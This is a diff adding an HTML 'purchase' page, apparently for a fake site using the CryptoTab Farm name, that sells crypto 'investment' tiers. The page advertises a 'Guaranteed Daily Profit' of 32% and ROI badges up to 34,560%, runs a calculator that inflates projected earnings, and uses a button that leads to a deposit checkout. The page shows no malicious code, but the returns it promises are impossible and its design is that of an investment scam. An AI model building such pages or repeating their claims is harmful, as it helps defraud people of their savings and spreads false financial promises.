@@ -1,0 +1,571 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    <title>CryptoTab Farm Purchase - Elite Tiers</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=JetBrains+Mono:wght@400;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../dashboard-theme.css">
+    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;600;700;800;900&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { 
+            box-sizing: border-box; 
+            margin: 0; 
+            padding: 0; 
+            font-family: 'Rajdhani', sans-serif; 
+        }
+        
+        body { 
+            background-color: #0a0a0f; 
+            color: #fff; 
+            overflow-x: hidden; 
+            position: relative;
+        }
+
+        /* Blockchain Background */
+        .blockchain-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 0;
+            overflow: hidden;
+            pointer-events: none;
+        }
+        .blockchain-bg canvas { display: block; }
+
+        /* Bitcoin Watermark */
+        .btc-watermark {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 600px;
+            font-family: 'Orbitron', monospace;
+            font-weight: 900;
+            color: rgba(247, 147, 26, 0.02);
+            z-index: 1;
+            pointer-events: none;
+            user-select: none;
+        }
+
+        /* Top Navigation */
+        .navbar { 
+            background: rgba(17, 17, 25, 0.85); 
+            backdrop-filter: blur(20px) saturate(180%);
+            padding: 0 40px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: space-between; 
+            height: 70px; 
+            border-bottom: 1px solid rgba(0, 212, 255, 0.2);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        
+        .nav-logo { 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            font-family: 'Orbitron', monospace;
+            font-weight: 900; 
+            font-size: 22px; 
+            text-decoration: none; 
+            color: #fff; 
+            letter-spacing: -1px;
+        }
+        .nav-logo span { font-weight: 400; font-size: 14px; color: #00d4ff; margin-left: 5px; letter-spacing: 2px; }
+        
+        .nav-tabs { display: flex; align-items: center; height: 100%; gap: 35px; }
+        .nav-tab { 
+            display: flex; 
+            align-items: center; 
+            gap: 8px; 
+            color: #00d4ff; 
+            text-decoration: none; 
+            font-weight: 700; 
+            font-size: 13px; 
+            height: 100%; 
+            text-transform: uppercase; 
+            border-bottom: 3px solid transparent; 
+            transition: all 0.3s ease;
+            letter-spacing: 1px;
+        }
+        .nav-tab.active { color: #fff; border-bottom-color: #f7931a; text-shadow: 0 0 15px rgba(247, 147, 26, 0.6); }
+        .nav-tab svg { width: 18px; height: 18px; fill: currentColor; }
+        
+        .nav-right { display: flex; align-items: center; gap: 20px; }
+        .balance-box { 
+            display: flex; 
+            align-items: center; 
+            gap: 10px; 
+            background: rgba(247, 147, 26, 0.1);
+            border: 1px solid rgba(247, 147, 26, 0.3); 
+            padding: 8px 18px; 
+            border-radius: 8px; 
+            font-weight: 800; 
+            font-size: 16px; 
+            color: #f7931a;
+            font-family: 'Orbitron', monospace;
+        }
+        .balance-box svg { width: 18px; height: 18px; fill: #f7931a; }
+        
+        /* Main Layout */
+        .main-container { 
+            max-width: 1200px; 
+            margin: 60px auto; 
+            padding: 0 40px; 
+            display: grid; 
+            grid-template-columns: 1.3fr 1fr; 
+            gap: 40px; 
+            position: relative;
+            z-index: 2;
+        }
+        
+        /* Glass Panels */
+        .panel { 
+            background: rgba(17, 17, 25, 0.6); 
+            backdrop-filter: blur(20px) saturate(180%);
+            border-radius: 24px; 
+            padding: 40px; 
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.4);
+        }
+        
+        .section-title { 
+            font-family: 'Orbitron', monospace;
+            font-size: 24px; 
+            font-weight: 800; 
+            margin-bottom: 25px; 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            color: #fff;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        
+        .info-icon { 
+            color: #00d4ff; 
+            border: 1px solid #00d4ff; 
+            border-radius: 50%; 
+            width: 18px; 
+            height: 18px; 
+            display: inline-flex; 
+            align-items: center; 
+            justify-content: center; 
+            font-size: 11px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            opacity: 0.7;
+        }
+
+        /* Profit Display */
+        .profit-banner {
+            background: linear-gradient(90deg, rgba(16, 185, 129, 0.1), transparent);
+            border-left: 4px solid #10b981;
+            padding: 20px;
+            margin-bottom: 30px;
+            border-radius: 0 12px 12px 0;
+        }
+        .profit-title { color: #10b981; font-weight: 800; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; margin-bottom: 5px; }
+        .profit-value { font-family: 'Orbitron', monospace; font-size: 32px; font-weight: 900; color: #fff; text-shadow: 0 0 20px rgba(16, 185, 129, 0.4); }
+        
+        /* Slider Styling */
+        .slider-section { margin-bottom: 45px; }
+        .slider-header { display: flex; justify-content: space-between; align-items: flex-end; margin-bottom: 15px; }
+        .speed-label { color: #8ea8c3; font-weight: 600; font-size: 14px; }
+        .speed-val { font-family: 'Orbitron', monospace; font-size: 28px; font-weight: 900; color: #00d4ff; }
+        
+        .slider-track { 
+            width: 100%; 
+            height: 10px; 
+            background: rgba(255, 255, 255, 0.05); 
+            border-radius: 5px; 
+            position: relative; 
+            cursor: pointer;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .slider-fill { 
+            position: absolute; 
+            left: 0; 
+            top: 0; 
+            height: 100%; 
+            background: linear-gradient(90deg, #0066ff, #00d4ff); 
+            border-radius: 5px; 
+            box-shadow: 0 0 15px rgba(0, 212, 255, 0.5);
+        }
+        .slider-thumb { 
+            position: absolute; 
+            top: 50%; 
+            transform: translate(-50%, -50%); 
+            width: 24px; 
+            height: 24px; 
+            background: #fff; 
+            border-radius: 50%; 
+            box-shadow: 0 0 20px rgba(0, 212, 255, 0.8); 
+            cursor: grab;
+            border: 4px solid #00d4ff;
+            transition: transform 0.1s;
+        }
+        .slider-thumb:active { cursor: grabbing; transform: translate(-50%, -50%) scale(1.2); }
+
+        /* Duration Cards */
+        .duration-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .duration-card { 
+            background: rgba(17, 17, 25, 0.4);
+            border: 2px solid rgba(255, 255, 255, 0.05); 
+            border-radius: 16px; 
+            padding: 25px; 
+            cursor: pointer; 
+            position: relative; 
+            transition: all 0.3s ease;
+        }
+        .duration-card:hover { border-color: rgba(0, 212, 255, 0.3); background: rgba(17, 17, 25, 0.8); transform: translateY(-3px); }
+        .duration-card.active { border-color: #00d4ff; background: rgba(0, 102, 255, 0.1); box-shadow: 0 0 30px rgba(0, 212, 255, 0.1); }
+        
+        .d-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px; }
+        .d-months { font-family: 'Orbitron', monospace; font-weight: 800; font-size: 18px; color: #00d4ff; }
+        .d-price { font-weight: 800; font-size: 16px; color: #fff; }
+        .d-subtext { color: #8ea8c3; font-size: 12px; font-weight: 600; margin-bottom: 15px; }
+        
+        .badge-row { display: flex; gap: 8px; margin-top: 10px; }
+        .badge { padding: 4px 10px; border-radius: 6px; font-size: 11px; font-weight: 800; color: #fff; text-transform: uppercase; }
+        .badge-roi { background: #10b981; }
+        .badge-vip { background: #f7931a; }
+        
+        /* Right Panel Order Details */
+        .order-panel { position: sticky; top: 100px; height: fit-content; }
+        .order-title { font-family: 'Orbitron', monospace; font-size: 26px; font-weight: 900; margin-bottom: 30px; text-transform: uppercase; background: linear-gradient(135deg, #fff, #00d4ff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
+        
+        .summary-row { display: flex; justify-content: space-between; margin-bottom: 20px; font-size: 15px; font-weight: 600; color: #8ea8c3; }
+        .summary-val { font-family: 'Orbitron', monospace; font-weight: 800; color: #fff; }
+        .summary-val.highlight { color: #10b981; }
+        
+        hr { border: none; border-top: 1px solid rgba(255, 255, 255, 0.1); margin: 25px 0; }
+        
+        .buy-btn { 
+            width: 100%; 
+            background: linear-gradient(135deg, #0066ff, #00d4ff); 
+            color: #fff; 
+            border: none; 
+            padding: 22px; 
+            border-radius: 12px; 
+            font-size: 18px; 
+            font-weight: 900; 
+            font-family: 'Orbitron', monospace;
+            cursor: pointer; 
+            transition: all 0.4s ease; 
+            margin-top: 20px; 
+            text-transform: uppercase;
+            box-shadow: 0 8px 30px rgba(0, 102, 255, 0.4);
+            letter-spacing: 1px;
+        }
+        .buy-btn:hover { 
+            transform: translateY(-3px); 
+            box-shadow: 0 15px 40px rgba(0, 212, 255, 0.6);
+        }
+
+        /* 3D Coin Positioning for Subscriptions */
+        .btc-3d-coin { position: fixed; bottom: 30px; right: 30px; width: 80px; height: 80px; z-index: 999; perspective: 1000px; }
+        .btc-3d-coin-inner { width: 100%; height: 100%; position: relative; transform-style: preserve-3d; animation: spinCoin 10s linear infinite; filter: drop-shadow(0 0 20px rgba(247, 147, 26, 0.6)); }
+        @keyframes spinCoin { 0% { transform: rotateY(0deg); } 100% { transform: rotateY(360deg); } }
+        .coin-face { position: absolute; width: 100%; height: 100%; background: linear-gradient(135deg, #f7931a, #ffb84d); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-family: 'Orbitron', monospace; font-size: 32px; font-weight: 900; color: #fff; border: 3px solid #ffb84d; }
+        .coin-face.front { transform: translateZ(5px); }
+        .coin-face.back { transform: rotateY(180deg) translateZ(5px); }
+    </style>
+    <link rel="stylesheet" href="../shared-enhancements.css">
+</head>
+<body>
+
+    <div class="blockchain-bg">
+        <canvas id="blockchainCanvas"></canvas>
+    </div>
+    <div class="btc-watermark">â‚¿</div>
+
+    <div class="btc-3d-coin">
+        <div class="btc-3d-coin-inner">
+            <div class="coin-face front">â‚¿</div>
+            <div class="coin-face back">â‚¿</div>
+        </div>
+    </div>
+
+    <!-- Top Navigation -->
+    <nav class="navbar">
+        <a href="../cryptotab.farm/en/index.html" class="nav-logo">
+            <svg viewBox="0 0 40 40" width="32" height="32" style="fill:#f7931a;"><path d="M20 0A20 20 0 1040 20 20 20 0 0020 0zm0 35A15 15 0 1135 20 15 15 0 0120 35z"/><path d="M20 10a10 10 0 1010 10 10 10 0 00-10-10z"/></svg>
+            CryptoTab <span>FARM</span>
+        </a>
+        
+        <div class="nav-tabs">
+            <a href="dashboard.html" class="nav-tab">DASHBOARD</a>
+            <a href="subscriptions.html" class="nav-tab active">PURCHASE</a>
+            <a href="withdrawal.html" class="nav-tab">WITHDRAWAL</a>
+            <a href="../products.html" class="nav-tab">PRODUCTS</a>
+        </div>
+        
+        <div class="nav-right">
+            <div class="balance-box">
+                <svg viewBox="0 0 24 24"><path d="M12 22C6.477 22 2 17.523 2 12S6.477 2 12 2s10 4.477 10 10-4.477 10-10 10zm-1-6v2h2v-2h1a2.5 2.5 0 000-5h-3v-2h4V7h-2V5h-2v2h-1a2.5 2.5 0 000 5h3v2h-4v2h2z"/></svg>
+                0 BTC
+            </div>
+        </div>
+    </nav>
+
+    <div class="main-container">
+        <!-- Left Panel -->
+        <div class="panel">
+            <div class="profit-banner">
+                <div class="profit-title">Guaranteed Daily Profit (32%)</div>
+                <div class="profit-value" id="dailyProfitBanner">$800.00</div>
+            </div>
+
+            <h2 class="section-title">Configure Power <span class="info-icon">i</span></h2>
+            
+            <div class="slider-section">
+                <div class="slider-header">
+                    <span class="speed-label">INVESTMENT AMOUNT</span>
+                    <span class="speed-val" id="investmentDisplay">$2,500</span>
+                </div>
+                <div class="slider-track" id="sliderTrack">
+                    <div class="slider-fill" id="sliderFill" style="width: 0%;"></div>
+                    <div class="slider-thumb" id="sliderThumb" style="left: 0%;"></div>
+                </div>
+            </div>
+            
+            <h2 class="section-title">Investment Period</h2>
+            <div class="duration-grid" id="durationGrid">
+                <div class="duration-card" data-months="36">
+                    <div class="d-header">
+                        <div class="d-months">36 MONTHS</div>
+                        <div class="d-price" id="total-36">$0.00</div>
+                    </div>
+                    <div class="d-subtext">TOTAL NET YIELD</div>
+                    <div class="badge-row">
+                        <div class="badge badge-roi">34,560% ROI</div>
+                        <div class="badge badge-vip">PLATINUM</div>
+                    </div>
+                </div>
+                
+                <div class="duration-card" data-months="24">
+                    <div class="d-header">
+                        <div class="d-months">24 MONTHS</div>
+                        <div class="d-price" id="total-24">$0.00</div>
+                    </div>
+                    <div class="d-subtext">TOTAL NET YIELD</div>
+                    <div class="badge-row">
+                        <div class="badge badge-roi">23,040% ROI</div>
+                        <div class="badge badge-vip">GOLD</div>
+                    </div>
+                </div>
+                
+                <div class="duration-card active" data-months="12">
+                    <div class="d-header">
+                        <div class="d-months">12 MONTHS</div>
+                        <div class="d-price" id="total-12">$0.00</div>
+                    </div>
+                    <div class="d-subtext">TOTAL NET YIELD</div>
+                    <div class="badge-row">
+                        <div class="badge badge-roi">11,520% ROI</div>
+                    </div>
+                </div>
+
+                <div class="duration-card" data-months="1">
+                    <div class="d-header">
+                        <div class="d-months">1 MONTH</div>
+                        <div class="d-price" id="total-1">$0.00</div>
+                    </div>
+                    <div class="d-subtext">MONTHLY YIELD</div>
+                    <div class="badge-row">
+                        <div class="badge badge-roi">960% ROI</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Right Panel -->
+        <div class="panel order-panel">
+            <h2 class="order-title">Transaction Summary</h2>
+            
+            <div class="summary-row">
+                <span>Principal Investment</span>
+                <span class="summary-val" id="summaryPrincipal">$2,500.00</span>
+            </div>
+            <div class="summary-row">
+                <span>Daily ROI Rate</span>
+                <span class="summary-val highlight">32.00%</span>
+            </div>
+            <div class="summary-row">
+                <span>Daily Profit</span>
+                <span class="summary-val highlight" id="summaryDailyProfit">+$800.00</span>
+            </div>
+            
+            <hr>
+            
+            <div class="summary-row">
+                <span>Contract Duration</span>
+                <span class="summary-val" id="summaryDuration">12 Months</span>
+            </div>
+            <div class="summary-row">
+                <span>Total Projected Profit</span>
+                <span class="summary-val highlight" id="summaryTotalProfit">$87,600.00</span>
+            </div>
+            
+            <hr>
+            
+            <div class="summary-row" style="margin-bottom: 5px;">
+                <span style="color: #8ea8c3;">Processing Fee</span>
+                <span class="summary-val" style="color: #10b981;">$0.00 (WAIVED)</span>
+            </div>
+            
+            <button class="buy-btn" id="buyBtn">DEPOSIT $2,500.00</button>
+            <p style="text-align: center; color: #8ea8c3; font-size: 12px; margin-top: 15px; font-weight: 500;">Instant activation after network confirmation.</p>
+        </div>
+    </div>
+
+    <script>
+        const sliderTrack = document.getElementById('sliderTrack');
+        const sliderFill = document.getElementById('sliderFill');
+        const sliderThumb = document.getElementById('sliderThumb');
+        const investmentDisplay = document.getElementById('investmentDisplay');
+        const dailyProfitBanner = document.getElementById('dailyProfitBanner');
+        const summaryPrincipal = document.getElementById('summaryPrincipal');
+        const summaryDailyProfit = document.getElementById('summaryDailyProfit');
+        const summaryDuration = document.getElementById('summaryDuration');
+        const summaryTotalProfit = document.getElementById('summaryTotalProfit');
+        const buyBtn = document.getElementById('buyBtn');
+        const durationCards = document.querySelectorAll('.duration-card');
+
+        let currentAmount = 2500;
+        let currentMonths = 12;
+        let isDragging = false;
+
+        const MIN_AMOUNT = 2500;
+        const MAX_AMOUNT = 50000;
+        const DAILY_RATE = 0.32;
+
+        function updateCalculations() {
+            const dailyProfit = currentAmount * DAILY_RATE;
+            const monthlyProfit = dailyProfit * 30;
+            
+            // Update Banner & Summary
+            dailyProfitBanner.innerText = `$${dailyProfit.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            summaryPrincipal.innerText = `$${currentAmount.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            summaryDailyProfit.innerText = `+$${dailyProfit.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            investmentDisplay.innerText = `$${currentAmount.toLocaleString()}`;
+            
+            const totalProfit = dailyProfit * 365 * (currentMonths / 12);
+            summaryTotalProfit.innerText = `$${totalProfit.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+            summaryDuration.innerText = `${currentMonths} Month${currentMonths > 1 ? 's' : ''}`;
+            
+            buyBtn.innerText = `DEPOSIT $${currentAmount.toLocaleString(undefined, {minimumFractionDigits: 2})}`;
+
+            // Update Cards
+            durationCards.forEach(card => {
+                const months = parseInt(card.dataset.months);
+                const yieldVal = dailyProfit * 365 * (months / 12);
+                card.querySelector('.d-price').innerText = `$${yieldVal.toLocaleString(undefined, {maximumFractionDigits: 0})}`;
+            });
+        }
+
+        function handleSlider(e) {
+            const rect = sliderTrack.getBoundingClientRect();
+            let offsetX = e.clientX - rect.left;
+            if (offsetX < 0) offsetX = 0;
+            if (offsetX > rect.width) offsetX = rect.width;
+            
+            const percent = offsetX / rect.width;
+            currentAmount = Math.round(MIN_AMOUNT + (percent * (MAX_AMOUNT - MIN_AMOUNT)));
+            
+            const displayPercent = (percent * 100).toFixed(1) + '%';
+            sliderFill.style.width = displayPercent;
+            sliderThumb.style.left = displayPercent;
+            
+            updateCalculations();
+        }
+
+        sliderTrack.addEventListener('mousedown', (e) => {
+            isDragging = true;
+            handleSlider(e);
+        });
+
+        window.addEventListener('mousemove', (e) => {
+            if (isDragging) handleSlider(e);
+        });
+
+        window.addEventListener('mouseup', () => {
+            isDragging = false;
+        });
+
+        durationCards.forEach(card => {
+            card.addEventListener('click', () => {
+                durationCards.forEach(c => c.classList.remove('active'));
+                card.classList.add('active');
+                currentMonths = parseInt(card.dataset.months);
+                updateCalculations();
+            });
+        });
+
+        buyBtn.addEventListener('click', () => {
+            alert(`Initializing secure deposit for $${currentAmount.toLocaleString()}...`);
+            const tier = `Investment Plan (${currentMonths} Mo)`;
+            window.location.href = `checkout.html?tier=${encodeURIComponent(tier)}&price=${currentAmount}&hash=${currentAmount * 40}`;
+        });
+
+        // Blockchain Canvas Animation
+        const canvas = document.getElementById('blockchainCanvas');
+        const ctx = canvas.getContext('2d');
+        canvas.width = window.innerWidth;
+        canvas.height = window.innerHeight;
+
+        class Node {
+            constructor() {
+                this.x = Math.random() * canvas.width;
+                this.y = Math.random() * canvas.height;
+                this.vx = (Math.random() - 0.5) * 0.5;
+                this.vy = (Math.random() - 0.5) * 0.5;
+                this.radius = Math.random() * 2 + 1;
+            }
+            update() {
+                this.x += this.vx; this.y += this.vy;
+                if (this.x < 0 || this.x > canvas.width) this.vx *= -1;
+                if (this.y < 0 || this.y > canvas.height) this.vy *= -1;
+            }
+            draw() {
+                ctx.beginPath(); ctx.arc(this.x, this.y, this.radius, 0, Math.PI * 2);
+                ctx.fillStyle = 'rgba(0, 212, 255, 0.4)'; ctx.fill();
+            }
+        }
+
+        const nodes = Array.from({length: 60}, () => new Node());
+
+        function animate() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            nodes.forEach(node => { node.update(); node.draw(); });
+            for (let i = 0; i < nodes.length; i++) {
+                for (let j = i + 1; j < nodes.length; j++) {
+                    const dist = Math.hypot(nodes[i].x - nodes[j].x, nodes[i].y - nodes[j].y);
+                    if (dist < 150) {
+                        ctx.beginPath(); ctx.moveTo(nodes[i].x, nodes[i].y); ctx.lineTo(nodes[j].x, nodes[j].y);
+                        ctx.strokeStyle = `rgba(0, 212, 255, ${1 - dist/150})`; ctx.lineWidth = 0.5; ctx.stroke();
+                    }
+                }
+            }
+            requestAnimationFrame(animate);
+        }
+        animate();
+
+        window.addEventListener('resize', () => {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        });
+
+        // Initial update
+        updateCalculations();
+    </script>
+    <script src="../shared-enhancements.js" defer></script>
+</body>
+</html>
+
